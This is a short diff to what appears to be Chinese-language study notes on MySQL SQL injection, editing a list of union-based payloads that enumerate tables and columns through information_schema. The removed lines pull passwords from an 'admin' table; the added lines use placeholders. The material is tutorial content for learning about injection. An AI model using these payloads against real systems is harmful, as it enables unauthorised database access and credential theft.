@@ -96,9 +96,8 @@ mysql的两种注释：
 	4.查询相关内容
     and 1=2 union select 1,2
     and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 
-    and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 
-    and 1=2 union select 1,password from admin  limit 0,1  # hellohack
-		
+    and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='zdafiilhhc' limit 0,1 
+    and 1=2 union select 1,列名 from 表名 limit 0,1
 ```
 用到的函数：
 ```
